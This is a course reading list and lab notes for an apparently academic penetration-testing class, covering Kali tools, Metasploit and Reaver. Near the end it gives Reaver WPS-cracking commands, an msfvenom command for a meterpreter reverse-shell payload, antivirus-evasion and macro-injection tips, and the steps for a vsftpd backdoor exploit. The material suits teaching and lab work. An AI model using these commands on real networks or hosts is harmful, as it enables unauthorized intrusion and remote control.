# Readings and Videos<p>
 
## Kali introductory readings

<details> 
  <summary>Some of the most useful tools in Kali Linux and what they do</summary>
from: https://stackoverflow.com/questions/32814161/how-to-make-spoiler-text-in-github-wiki-pages
 
1. Metasploit - Main part of Kali Linux, This tool is used to enumerate a network, attacking on the servers using appropriate exploits and Payloads. Along with this you can use it for post exploitation purposes

2. THC Hydra - A online Password Cracker tool, which is used to Crack the password of a remote host / server

3. Armitage - Graphical display of metasploit for attacking on a server

4. WafW00f - The Firewall Detection tool

5. Fierce - The Domain Information Digging tools used to enumerate the server users

6. Hping3 - A tool used for Launching DoS (Denial of Service) or DDoS (Distributed Denial of Service) attacks

7. Airmon - ng, Airbase - ng, Aircrack - ng - Used to monitor, Collect information about Wi - Fi SSID (Service Set Identifier) IP and MAC Addresses and Cracking Password of Wi - Fi

8. OWASP ZAP - used as a web Crawler (Spidering)

9. Burpsuite - Used as a penetration testing tool to introduce Local file or Remote File Inclusion

10. Maltego - Used to collect information of remote hosts

11. W3AF - Arconym for Web Application Attack and Audit Framework, used to find flaws in a website

12. NMap and Netcat - Used to find open network ports

13. Nikto Scanner - Used to find critical vulnerabilities in a website

14. Wpscan - used to find flaws in a wordpress website

15. Recon - ng - Used to reconnaissance of a profile through any sort of social media

16. Magictree - Used to collect information by collecting inputs from a Penetration Tester

17. Whois - Gives the entire information about website

18. Nslookup & Dig - A part of reconnaissance tools gives the exact information of a web server

19. Wireshark - A packet analyzer used to find the activity in a Transmission control protocol / Internet Protocol / IGRP / ICMP etc.

20. Kismet - Wireless Intrusion detection System
</details>
<p>

[Kali Linux Official Documentation](https://docs.kali.org/)<br />

[Kali Linux Custom Images](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/)<br />

[Kali Blog: Linux in the Windows App Store](https://www.kali.org/news/kali-linux-in-the-windows-app-store/)<br />

[Kali Blog: Kali Drones, Portable CTF Builds, Raspberry Pi Craziness and More!](https://www.kali.org/news/kali-drones-portable-ctf-builds-raspberry-pi-craziness-and-more/)<br />


[Configuring and Tuning OpenVAS in Kali Linux](https://www.kali.org/tutorials/configuring-and-tuning-openvas-in-kali-linux/)<br />

[Nmap scanner gets new scripts](https://www.infoworld.com/article/3152617/security/nmap-security-scanner-gets-new-scripts-performance-boosts.html)<br />

[Mastering the Nmap Scripting Engine (video from DefCon 18, 38mins, non-obligatory)](https://www.infoworld.com/article/3152617/security/nmap-security-scanner-gets-new-scripts-performance-boosts.html)<br />

**Highly Suggested brief reading:** [Offline Bruteforce Attack on Wifi Protected Setup](http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf)<br />



  
## Metasploit<p>

##### n.b. any ebooks are cuny-wide resources but if you have issues with the proxy please search in the JJay OneSearch [here](https://onesearch.cuny.edu/primo-explore/search?vid=jj&mode=advanced&sortby=rank&lang=en_US).<br />
[A Tour of the Metasploit Framework](http://www.ethicalhackx.com/metasploit-framework/).<br />
**Suggested brief reading:** [Metasploit for Beginners](https://www.concise-courses.com/security/metasploit-for-beginners/).<br />
[A Tour of the Metasploit Framework](http://www.ethicalhackx.com/metasploit-framework/).<br />
[Hands on with Metasploit Express (ScienceDirect)](https://doi.org/10.1016/S1353-4858(10)70092-1).<br />
[Instant Metasploit Starter (ProQuest ebook)](https://onesearch.cuny.edu/primo-explore/fulldisplay?docid=TN_ingram_myilibrary9781299802681&context=PC&vid=jj&search_scope=cunywide&tab=cuny_tab&lang=en_US).<br />
[Mastering Metasploit (ProQuest ebook)](https://onesearch.cuny.edu/primo-explore/fulldisplay?docid=TN_ingram_myilibrary9781306823425&context=PC&vid=jj&search_scope=everything&tab=default_tab&lang=en_US).<br />
[SANS Metasploit Cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf).<br />
[Setting up a Metasploit postgresql database](https://www.offensive-security.com/metasploit-unleashed/using-databases/).<p>
<p>


<p>
Youtube: Metasploit for Beginners<br />
  
[![thumbnail from the video](http://img.youtube.com/vi/cnkLv_RE3EI/0.jpg)](https://www.youtube.com/watch?v=cnkLv_RE3EI "MetaSploit tutorial for beginners")<p>
<p>
  

Hak5's Metasploit Minute series<br />
  
[![thumbnail from the video](http://img.youtube.com/vi/NTdthBQYa1k/0.jpg)](https://www.youtube.com/watch?v=NTdthBQYa1k "5 Ways To Get Initial Access - Metasploit Minute")<p>

Hackersploit's Metasploit For Beginners - #1 - The Basics - Modules, Exploits & Payloads<br />
  
[![thumbnail from the video](http://img.youtube.com/vi/8lR27r8Y_ik/0.jpg)](https://www.youtube.com/watch?v=8lR27r8Y_ik "Metasploit For Beginners - #1 - The Basics - Modules, Exploits & Payloads")<p>
<p>
 
## Reaver<p>

 
 ##### Pixie Dust attack
 
 ![Options](https://comfy.moe/xeuglf.png)
  <p>

  
![The old way](https://www.hackingtutorials.org/wp-content/uploads/2015/06/Wordpress-screen-21-e1433583260536.jpg)
  <p>

`reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K`    
![With the pixie dust option](https://comfy.moe/hhojvn.jpg)
  <p>
 
 `reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 39627124`
 ![With the pixie dust option - result](https://comfy.moe/tyhfos.jpg)
  
<p>
 
  ### Demonstration of using Metasploit<br />
  <br />
  * use ZenMap to see software running and note network topography
  * db_nmap_status, db_nmap -T4 -A -v metasploitableIP
  #### Creating Payloads
  
  
  * msfvenom -h
  * msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lport=8080 lhost=LOCALHOST -f exe > /root/Desktop/payload.exe (not encoded)
  * Veil framework (veil-evasion) (payload with .bat extension, use Macroshop, inject in docx for Office macros)
  
  start postgresql before msfconsole<br />
  db_status<br />
  show -h<br />
  show exploits <br />
  searching by type and platform<br />
  <p>
  commands:<br />
  
  * search type:exploit platform:windows flash
  * help
  * use exploit/windows/browser/adobe_flash_avm2 (turns red if loaded)
  * show options (customize the attack) and set SRVPORT 80
  
  ANOTHER and BETTER EXAMPLE:

  * show (gives lots of info)
  * show info (good place to start)
  * show payloads (shows all of the payloads available)
  * show targets
  * search vsftpd
  * use exploit/unix/ftp/vsftpd_234_backdoor
  * info
  * set RHOST 10.______
  * finish with 'check' and 'exploit'
  <p>
  Modules directory:  /usr/share/metasploit-framework<br />
  NOPS for buffer overflows<br />
  Encoding for sneaking through antivirus<br />
  post for further attacks are being pwned (keyloggers, VNC, etc.)<br />
  post/windows/gather <--btc-mining and other scripts<br />
  
  Armitage - GUI for MSF
  
  ezsploit automation
  
### Reconnaisance:<br />
[CTFR](https://github.com/UnaPibaGeek/ctfr)<p>
![CTFR](https://a.pomf.cat/qqtejp.png)
 <p>
 
### Shodan: FREE full membership with a .edu address: 
 ![Shodan](https://a.pomf.cat/tbucxr.png)
 
 Register here: https://account.shodan.io/register and email support@shodan.io from the .edu email.
  
